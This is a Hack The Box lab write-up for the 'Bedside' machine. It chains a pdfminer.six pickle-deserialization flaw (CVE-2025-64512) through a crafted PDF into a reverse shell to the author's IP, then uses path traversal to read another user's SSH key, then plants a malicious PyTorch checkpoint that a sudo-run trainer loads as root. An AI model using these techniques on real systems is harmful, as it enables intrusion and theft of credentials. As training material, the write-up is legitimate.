<img src="images/bedside.png" alt="Hack The Box Bedside machine icon" width="110" />

# Bedside - Hack The Box Writeup

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-F0A13B)
![Operating System](https://img.shields.io/badge/OS-Linux-FCC624?logo=linux&logoColor=black)

*A Linux machine covering PDFMiner exploitation, Docker pivoting, path traversal, and PyTorch deserialization for root privilege escalation.*

by: Brandon Chaney

## Overview

Bedside starts with an unsuspecting clinic website. A virtual host scan reveals a portal accepting images, PDFs, and archives, and exposes a vulnerable PDF processor. Exploitation leads inside a Docker container of a development server, and path traversal can be used to read the user `developer`'s SSH key.

The root path comes from the sole sudo permission of `developer`, the ability to run `/usr/bin/python3 /opt/trainer/bedside_trainer.py` passwordless. The script executed as root loads checkpoints from a directory writeable by the container account `datawrangler`. An unsafe PyTorch checkpoint can be used to execute commands as root, leading to full system compromise.

## Enumeration

I started with Nmap. SSH and Apache were open, and port `3000` was **filtered**. It's inaccessible outward-facing but will prove useful later.

```bash
┌──[brandonc@parrot]─[~]
└─❯ nmap -sV -sC -A 10.129.134.251

PORT     STATE    SERVICE VERSION
**22/tcp   open     ssh     OpenSSH 10.0p2 Debian
**80/tcp   open     http    Apache httpd 2.4.68
3000/tcp filtered ppp

|_http-title: Did not follow redirect to http://bedside.htb/
```

I added `bedside.htb` to `/etc/hosts`. The main website's functionality was limited to a single home page, so I moved to directory and virtual host enumeration. Directory scans mostly returned `index.php` and normal Apache paths. The vhost scan was more useful:

```bash
┌──[brandonc@parrot]─[~]
└─❯ ffuf -u http://bedside.htb/ \
  -H "Host: FUZZ.bedside.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac -o bedside-vhosts.json -of json

┌──[brandonc@parrot]─[~]
└─❯ jq -r '.results[] | "\(.input.FUZZ) - HTTP \(.status)"' bedside-vhosts.json
research - HTTP 200
```

I mapped `research.bedside.htb` to the machine IP, revealing a **Bedside Research Portal** with a file upload section. It accepted images, DICOM files, PDFs, and ZIP/GZ archives. It also mentioned that certain files might be converted for AI training, so I had to be careful my files were unaltered by checking hashes before and after upload.

## Testing the Upload

I wasn't sure how difficult this would be, as it was my first Medium machine, so I hastily tried for PHP remote execution. I first checked whether uploaded files were retrievable:

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -I http://research.bedside.htb/uploads/test.zip
HTTP/1.1 200 OK
Content-Type: application/zip
```

The zip was reachable, but its contents weren't extracted server-side (I tried reaching a test file from inside the zip named `probe.txt`  which returned `404`). Asking for `.php` files in `/uploads/` gave `403`, even for invalid filenames, so I couldn't tell whether PHP was actually present.

I tried a PHP file disguised as a PNG. The server wasn't fooled by the extension or the HTTP MIME header:

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -s \
  -F "uploadFile=@probe.php.png;type=image/png" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads</div>
```

That error was useful for two reasons: 1. From this I could tell the application checked more than just the filename, and 2. The response gave away the full upload directory `/var/www/research.bedside.htb/uploads`.

I futilely tried looking for a PHP upload exploit again, this time with an actual PNG with PHP appended at the end. This time the upload succeeded, but downloading the file showed the PHP source still there as it was, without execution.

```bash
┌──[brandonc@parrot]─[~]
└─❯ cp test.png polyglot.php.png
┌──[brandonc@parrot]─[~]
└─❯ printf '\n<?php echo "EXECUTION_TEST"; ?>\n' >> polyglot.php.png
┌──[brandonc@parrot]─[~]
└─❯ curl -s -F "uploadFile=@polyglot.php.png;type=image/png" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">File uploaded successfully: polyglot.php.png</div>

┌──[brandonc@parrot]─[~]
└─❯ curl -s http://research.bedside.htb/uploads/polyglot.php.png -o polyglot-returned.png
┌──[brandonc@parrot]─[~]
└─❯ strings polyglot-returned.png | grep -E 'EXECUTION_TEST|<\?php'
<?php echo "EXECUTION_TEST"; ?>
```

Unwilling to give up, I compared downloaded PNG, PDF, and DICOM files with the originals' `sha256sum`, and the hashes matched. I was spending too much time on upload extensions without there being evidence that PHP execution was even possible.

I decided to pivot on the info in the response header:

```http
X-Powered-By: pdfminer.six
```

## PDFMiner - Code Execution via Uploads

With a little research, `pdfminer.six` was vulnerable to **CVE-2025-64512**, a deserialization exploit within its CMap loading code. The vulnerability stems from a PDF being able to name a CMap (character map) file (like .pickle.gz), and vulnerable versions of PDFMiner could be influenced on which CMap file to load, for example, from a PDF. Combining this with Python's `pickle.loads()`, attackers could execute code during the rebuilding of an object.

> Basically, the vulnerability let me use a PDF's font encoding to point PDFMiner toward a file outside its normal character map directory. Since I already knew where uploads were stored, I could upload a malicious `.pickle.gz` file and create a PDF that referenced it. When the server processes the PDF, PDFMiner would load the pickle using `pickle.loads()`, and execute my Python payload. 

Since I knew the directory path, I started by uploading my `.pickle.gz` files there.

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -I http://research.bedside.htb/uploads/cmap-probe.pickle.gz
HTTP/1.1 200 OK
Content-Type: application/x-gzip
```

It's also important to mention the exploit requires **two files**, not just the malicious PDF:

1. A `.pickle.gz` file in the known uploads directory containing the payload.
2. A PDF whose font references the malicious pickle through `/Encoding` (triggering the execution).

I built No.2, the PDF with the font encoding pointing to my uploaded payload pickle. The interesting part here was:

```pdf
/Type /Font
/Subtype /Type0
/BaseFont /TestFont
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fcmap-net
/DescendantFonts [6 0 R]
```

The `#2F` here represents a `/` in a PDF name. The reference, once decoded, is: `/var/www/research.bedside.htb/uploads/`. I included the Python payload-building code under [`scripts/build_pdfminer_payload.py`](scripts/build_pdfminer_payload.py) if you want to take a closer look at it.

Before running these two files with a netcat listener, I tested with a harmless HTTP callback:

```bash
┌──[brandonc@parrot]─[~]
└─❯ python3 -m http.server 8000 --bind 10.10.14.206
Serving HTTP on 10.10.14.206 port 8000 ...
```

After uploading `cmap-net.pickle.gz` and `trigger-net.pdf`, the machine contacted my server:

```text
10.129.134.251 - - "GET / HTTP/1.1" 200 -
10.129.134.251 - - "GET / HTTP/1.1" 200 -
10.129.134.251 - - "GET / HTTP/1.1" 200 -
```

The requests arrived roughly 30 seconds apart, and was confirmation that my payload would work. I then switched to a reverse-shell payload, using `10.10.14.206` on `tun0` and port `4444`:

```bash
┌──[brandonc@parrot]─[~]
└─❯ nc -lvnp 4444
```

```bash
┌──[brandonc@parrot]─[~]
└─❯ curl -s \
  -F "uploadFile=@cmap-shl.pickle.gz;type=application/gzip" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">File uploaded successfully: cmap-shl.pickle.gz</div>

┌──[brandonc@parrot]─[~]
└─❯ curl -s \
  -F "uploadFile=@trigger-shl.pdf;type=application/pdf" \
  http://research.bedside.htb/ | grep 'class="message"'
<div class="message">File uploaded successfully: trigger-shl.pdf</div>
```

The listener received a connection:

```bash
datawrangler@data-wrangler:/app$ whoami
datawrangler

datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)

datawrangler@data-wrangler:/app$ hostname
data-wrangler
```

## Inside the Data-Wrangler Container

The filesystem that I connected to had `/.dockerenv`, so I could infer I was in a Docker container and not yet on the host. There were a couple files present in the `/app` directory that I could take a look at next:

```bash
datawrangler@data-wrangler:/app$ ls -la /app
-rw-rw-r-- 1 root root 2191 Nov 10 2025 pdf_watcher.py
-rw-rw-r-- 1 root root   23 Nov  9 2025 requirements.txt
```

The interesting file in `/app` was `pdf_watcher.py`. Its behavior explained the repeating callbacks noted earlier:

```python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"
SLEEP_INTERVAL = 30

# Inside its loop:
subprocess.run(["pdf2txt.py", pdf_path, "-o", output_file], timeout=10, check=True)
```

The `pdf_watcher.py` scanned uploaded PDFs every 30 seconds and had their text written to `/datastore/staging`, illustrating how my payloads were able to continuously trigger. I also was able to find that `/datastore` and `/uploads` were mounted into the container from the host filesystem. I was back to the enumeration stage, looking for paths to virtual escape or ways to interact with the host more...

```bash
datawrangler@data-wrangler:/app$ cat /proc/self/mountinfo | grep -E 'datastore|research.bedside'
249 241 8:4 /datastore /datastore rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
253 241 8:4 /var/www/research.bedside.htb/uploads /var/www/research.bedside.htb/uploads rw,relatime - ext4 /dev/sda4 rw,errors=remount-ro
```

Having writable storage didn't give me an escape by itself. I looked back at the filtered **port 3000** from before (original Nmap scan).

## Port 3000 — From Docker to the Host

From my Parrot machine, TCP port `3000` timed out. Now, from inside the Docker container, it was reachable:

```bash
datawrangler@data-wrangler:/app$ curl -i --max-time 8 http://10.129.134.251:3000/
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<title>Bedside Clinic - Image Viewer</title>
```

The page was an MRI image viewer with hot module reloading (HMR), which was interesting. Its source referenced `/@hmr`, was able to find the process launches with `/usr/bin/esm.sh serve .`. I thought that since this was a deployment server (due to `/@hmr` reference), there could be some exposed functionalities. I tried a couple of normal file requests, but `/package.json` and `/.env` both returned 404.

I also tested if the development server would let me request files outside its web root. The important piece of information that progressed my attack was the `curl` flag `--path-as-is`, which keeps `../` segments intact instead of normalizing them (and thus providing an attack vector for directory traversal):

```bash
datawrangler@data-wrangler:/app$ curl --path-as-is -i \
  "http://10.129.134.251:3000/../../../../etc/hostname"
HTTP/1.1 200 OK
Content-Type: application/octet-stream

bedside
```

That command was the breakthrough I was looking for. I could read the **host's** `/etc/hostname`, instead of container's. I checked `/etc/passwd` next and found `developer`, UID 1000. The server's process status also showed it ran with UID 1000, and so I could read files `developer` was permitted to read:

```bash
datawrangler@data-wrangler:/app$ curl -s --path-as-is \
  "http://10.129.134.251:3000/../../../../proc/self/status" \
  | grep -E 'Name|Uid|Gid'
Name:   esm.sh
Uid:    1000 1000 1000 1000
Gid:    1000 1000 1000 1000
```

Using the same traversal technique gave me the user flag:

```bash
datawrangler@data-wrangler:/app$ curl -s --path-as-is \
  "http://10.129.134.251:3000/../../../../home/developer/user.txt"
```

I had some important exploits found, but I was still operating in the container shell. After a little searching, I found `developer`'s SSH key:

```bash
datawrangler@data-wrangler:/app$ curl -i --path-as-is \
  "http://10.129.134.251:3000/../../../../home/developer/.ssh/id_rsa"
HTTP/1.1 200 OK
Content-Type: application/octet-stream

-----BEGIN OPENSSH PRIVATE KEY-----
[redacted]
-----END OPENSSH PRIVATE KEY-----
```

Though the name was `id_rsa`, the file contained an **unencrypted Ed25519 key**. I saved it as `developer_key` on Parrot, restricted its permissions, and used it to SSH directly into the machine:

```bash
┌──[brandonc@parrot]─[~]
└─❯ chmod 600 developer_key
┌──[brandonc@parrot]─[~]
└─❯ ssh -i developer_key developer@10.129.134.251

developer@bedside:~$ whoami
developer
developer@bedside:~$ hostname
bedside
```

## Privilege Escalation - Using the MONAI Trainer

My first command after SSH'ing as `developer` was `sudo -l`:

```bash
developer@bedside:~$ sudo -l

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

`developer` has sudo permissions for running a `bedside_trainer.py` script. I couldn't edit the file itself, as it was owned by root, but I could read it. It was a MONAI/PyTorch training script that used directories under `/datastore`:

```python
CHECKPOINT_DIR = Path("/datastore/checkpoints")
PROCESSED_DIR = Path("/datastore/processed")
STAGING_DIR = Path("/datastore/staging")
```

The interesting part of its functionality was how it selected and loaded checkpoints. There seems to be an absence of any sort of verification -- It loads the newest checkpoint and runs it without checking who wrote it:

```python
def find_latest_checkpoint(checkpoint_dir):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

# Later in main():
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
loader = CheckpointLoader(
    load_path=str(latest_ckpt),
    load_dict={"model": model, "optimizer": optimizer},
    map_location=DEVICE
)
loader(engine)
```

This is where the two accounts fit together. **`developer` could launch the trainer as root, but couldn't read or write to `/datastore/checkpoints`**. I still had the docker shell for `datawrangler` open, and `datawranger` did have the ability to write there. The restricted account had access to the data, and the privileged process trusts that data. Combining the two will allow me root access.

I checked the installed libraries: PyTorch `2.5.0+cpu`, MONAI `1.5.0`. Reading into how `CheckpointLoader.__call__` is referenced revealed one line that mattered:

```python
checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
```

Because this has weights-only set to false, this permits unpickling objects that may execute Python code. For this sudo code execution, I didn't need to change the trainer, I only needed to make it load a file that I control.

There was one small issue stopping this: the script **exits before loading a checkpoint if there aren't any training samples**. I used my `datawrangler` shell to create a small PNG within `/datastore/processed/` to suffice this rule. I then placed a `.pt` checkpoint containing a malicious `data.pkl` in `/datastore/checkpoints/`. The construction I used is in [`scripts/build_checkpoint.py`](scripts/build_checkpoint.py) if you want to examine it. The important section of code from it is listed below:

```python
class RootProof:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (["/bin/sh", "-c", "id > /tmp/root-proof.txt"],))
```

### Final Tweaks

Putting all the pieces together, I began to execute my final attack. My first payload made a SUID copy of Bash at `/tmp/rootbash`. It was owned by root and had the SUID bit, but running it didn't elevate me because `/tmp` was mounted with `nosuid`:

```bash
developer@bedside:~$ findmnt -no OPTIONS /tmp
rw,nosuid,nodev,nr_inodes=1048576,inode64
```

I changed the checkpoint payload to a simpler proof and reran it with the same sudo command, `/usr/bin/python3 /opt/trainer/bedside_trainer.py`:

```bash
developer@bedside:~$ cat /tmp/root-proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

I now had confirmation of root code execution. Even though my interactive SSH session was still `developer`, **The checkpoint executed with UID 0**.

## Root Flag

Finally, I replaced the checkpoint payload with a command to copy the root flag to a readable temporary file:

```python
command = "cp /root/root.txt /tmp/bedside-root-flag && chmod 644 /tmp/bedside-root-flag"
```

I triggered the trainer once more and grabbed the root flag:

```bash
developer@bedside:~$ sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
# The same post-deserialization TypeError followed.

developer@bedside:~$ ls -l /tmp/bedside-root-flag
-rw-r--r-- 1 root root 33 /tmp/bedside-root-flag

developer@bedside:~$ cat /tmp/bedside-root-flag
```

## Key Findings

- The main clinic page was a dead end, but virtual-host enumeration found `research.bedside.htb` and its upload portal.
- The portal checked file contents, so simply disguising PHP as a PNG didn't lead to execution. The upload error disclosed the absolute server path, which turned out to matter later.
- **CVE-2025-64512** let a crafted PDF direct vulnerable PDFMiner to an attacker-supplied `.pickle.gz`, giving code execution as `datawrangler` in Docker.
- Port `3000` was filtered externally but accessible from the container. The development server allowed path traversal outside its web root, exposing `developer`'s SSH key.
- A successful SSH login gave an interactive `developer` shell and access to the user flag.
- The root-run MONAI trainer loaded checkpoint files from a `datawrangler`-writable directory with **`torch.load(..., weights_only=False)`**. That trust boundary enabled root code execution.
